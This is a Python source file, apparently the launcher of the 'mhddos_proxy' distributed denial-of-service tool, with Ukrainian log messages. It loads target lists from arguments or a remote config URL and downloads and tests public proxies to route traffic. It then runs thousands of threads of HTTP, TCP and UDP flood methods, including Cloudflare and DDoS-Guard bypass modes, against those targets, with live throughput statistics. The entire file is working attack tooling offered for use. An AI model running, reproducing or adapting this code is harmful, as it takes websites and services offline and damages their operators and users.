import argparse
import logging
import os
import random
import socket
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache
from multiprocessing import cpu_count
from pathlib import Path
from threading import Thread, Lock
from time import sleep, time

import requests
from PyRoxy import Proxy
from tabulate import tabulate
from yarl import URL

from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main, Tools


PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
PROXY_TIMEOUT = 5
UDP_THREADS = 1
LOW_RPC = 1000

THREADS_PER_CORE = 1000
MAX_DEFAULT_THREADS = 4000


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


@lru_cache(maxsize=128)
def resolve_host(url):
    return socket.gethostbyname(URL(url).host)


Params = namedtuple('Params', 'url, ip, method, threads')


class AtomicCounter:
    def __init__(self, initial=0):
        self.value = initial
        self._lock = Lock()

    def __iadd__(self, value):
        self.increment(value)
        return self

    def __int__(self):
        return self.value

    def increment(self, num=1):
        with self._lock:
            self.value += num

    def reset(self, value=0):
        with self._lock:
            old = self.value
            self.value = value
        return old


class Targets:
    def __init__(self, targets, config):
        self.targets = targets
        self.config = config
        self.config_targets = []

    def __iter__(self):
        self.load_config()
        for target in self.targets + self.config_targets:
            yield self.prepare_target(target)

    def prepare_target(self, target):
        if '://' in target:
            return target

        try:
            _, port = target.split(':', 1)
        except ValueError:
            port = '80'

        scheme = 'https://' if port == '443' else 'http://'
        return scheme + target

    def load_config(self):
        if not self.config:
            return

        path = Path('..') / self.config
        is_local = path.is_file()
        if is_local:
            config_content = path.read_text()
        else:
            try:
                config_content = requests.get(self.config, timeout=5).text
            except requests.RequestException:
                logger.warning(f'{cl.FAIL}Не вдалося (пере)завантажити конфіг - буде використано останні відомі цілі{cl.RESET}')
                return

        self.config_targets = [
            target.strip()
            for target in config_content.split()
            if target.strip()
        ]

        if is_local:
            logger.info(f'{cl.OKBLUE}Завантажено конфіг із локального файлу {cl.WARNING}{self.config} '
                        f'на {len(self.config_targets)} цілей{cl.RESET}')
        else:
            logger.info(f'{cl.OKBLUE}Завантажено конфіг із віддаленого серверу {cl.WARNING}{self.config} '
                        f'на {len(self.config_targets)} цілей{cl.RESET}')


def download_proxies():
    response = requests.get(PROXIES_URL, timeout=10)
    for line in response.iter_lines(decode_unicode=True):
        yield Proxy.fromString(line)


def update_proxies(period, targets, threads, proxy_timeout):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time() - last_update) < period / 2:
            logger.info(f'{cl.OKGREEN}Використовується список проксі з попереднього запуску{cl.RESET}')
            return

    logger.info(f'{cl.OKGREEN}Завантажуємо список проксі...{cl.RESET}')
    Proxies = list(set(download_proxies()))
    random.shuffle(Proxies)

    size = len(targets)
    logger.info(
        f'{cl.WARNING}Перевіряємо на працездатність {cl.OKBLUE}{len(Proxies):,}{cl.WARNING}'
        f' проксі - це може зайняти пару хвилин:{cl.RESET}'
    )

    future_to_proxy = {}
    with ThreadPoolExecutor(threads) as executor:
        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
            resolved_target = URL(target).with_host(resolve_host(target))
            future_to_proxy.update({
                executor.submit(proxy.check, resolved_target, proxy_timeout): proxy
                for proxy in chunk
            })

        CheckedProxies = [
            future_to_proxy[future]
            for future in as_completed(future_to_proxy) if future.result()
        ]

    if not CheckedProxies:
        logger.error(
            'Не знайдено робочих проксі. '
            'Переконайтеся що інтернет з`єднання стабільне і ціль доступна. '
            'Перезапустіть Docker.'
        )
        exit()

    logger.info(f'{cl.WARNING}Знайдено робочих проксі: {cl.OKBLUE}{len(CheckedProxies):,}{cl.RESET}')

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', 'w') as wr:
        for proxy in CheckedProxies:
            wr.write(str(proxy) + '\n')


def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        ip = resolve_host(target)
        target = URL(target)
        # UDP
        if target.scheme == 'udp':
            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))

        # TCP
        elif target.scheme == 'tcp':
            params_list.append(Params(target, ip, 'TCP', threads_per_target))

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, ip, method, threads))

    logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
    statistics = {}
    for params in params_list:
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            **params._asdict(),
            'proxy_fn': 'empty.txt' if vpn_mode else 'proxies.txt',
            'rpc': rpc,
            'timer': period,
            'statistics': thread_statistics,
            'sock_timeout': proxy_timeout
        }
        Thread(target=mhddos_main, kwargs=kwargs, daemon=True).start()
        if not table:
            logger.info(
                f"{cl.WARNING}Атакуємо{cl.OKBLUE} %s{cl.WARNING} методом{cl.OKBLUE} %s{cl.WARNING}, потоків:{cl.OKBLUE} %d{cl.WARNING}!{cl.RESET}"
                % (params.url.host, params.method, params.threads))

    if not (table or debug):
        logger.info(f'{cl.OKGREEN}Атака запущена, новий цикл через {period} секунд{cl.RESET}')
        sleep(period)
        return

    ts = time()
    refresh_rate = 4 if table else 2
    sleep(refresh_rate)
    while True:
        passed = time() - ts
        if passed > period:
            break

        tabulate_text = []
        total_pps = 0
        total_bps = 0
        for k in statistics:
            counters = statistics[k]
            pps = int(counters['requests'].reset() / refresh_rate)
            total_pps += pps
            bps = int(counters['bytes'].reset() / refresh_rate)
            total_bps += bps
            if table:
                tabulate_text.append(
                    (f'{cl.WARNING}%s' % k.url.host, k.url.port, k.method, k.threads, Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
                )
            else:
                logger.debug(
                    f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
                    (
                        k.url.host,
                        k.url.port,
                        k.method,
                        k.threads,
                        Tools.humanformat(pps),
                        Tools.humanbytes(bps),
                        round((time() - ts) / period * 100, 2),
                    )
                )

        if table:
            tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbytes(total_bps)}{cl.RESET}'))

            cls()
            print_banner(vpn_mode)
            print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
            print(tabulate(
                tabulate_text,
                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
                tablefmt='fancy_grid'
            ))

        sleep(refresh_rate)


def get_resolvable_targets(targets):
    targets = list(set(targets))
    with ThreadPoolExecutor(len(targets)) as executor:
        future_to_target = {
            executor.submit(resolve_host, target): target
            for target in targets
        }
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                future.result()
                yield target
            except socket.gaierror:
                logger.warning(f'{cl.FAIL}Ціль {target} недоступна і не буде атакована{cl.RESET}')


def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
    os.chdir('mhddos')
    if table:
        debug = False
    if debug:
        logger.setLevel(logging.DEBUG)

    for bypass in ('CFB', 'DGB', 'BYPASS'):
        if bypass in http_methods:
            logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - атака методами за замовчуванням може бути ефективніша{cl.RESET}')

    while True:
        targets = list(get_resolvable_targets(targets_iter))
        if not targets:
            logger.error(f'{cl.FAIL}Не знайдено жодної доступної цілі{cl.RESET}')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перемикань кожного потоку між проксі.'
            )

        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
        if not no_proxies:
            update_proxies(period, targets, max(total_threads, THREADS_PER_CORE), proxy_timeout)
        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='*',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-c',
        '--config',
        help='URL to remote or path to local config file',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=min(THREADS_PER_CORE * cpu_count(), MAX_DEFAULT_THREADS),
        help='Total number of threads to run (default is CPU * 1000)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=900,
        help='How often to update the proxies (in seconds) (default is 900)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=2000,
        help='How many requests to send on a single proxy connection (default is 2000)',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Print log as text',
    )
    parser.add_argument(
        '--table',
        action='store_true',
        default=False,
        help='Print log as table',
    )
    parser.add_argument(
        '--vpn',
        dest='vpn_mode',
        action='store_true',
        default=False,
        help='Disable proxies to use VPN',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        type=str.upper,
        default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
        choices=Methods.LAYER7_METHODS,
        help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
    )
    parser.add_argument(
        '--proxy-timeout',
        type=float,
        default=5,
        help='How many seconds to wait for the proxy to make a connection (default is 5)'
    )
    return parser


def print_banner(vpn_mode):
    print(f'''
                            {cl.HEADER}!!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}{cl.RESET}

- {cl.WARNING}VPN замість проксі{cl.RESET} - прапорець `--vpn`
- {cl.WARNING}Навантаження (кількість потоків){cl.RESET} - параметр `-t 3000`, за замовчуванням - CPU * 1000
- {cl.WARNING}Статистика у вигляді таблиці{cl.RESET} - прапорець `--table`
- {cl.WARNING}Статистика у вигляді тексту{cl.RESET} - прапорець `--debug`
- {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
    ''')


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    start(
        args.threads,
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.proxy_timeout,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
    )
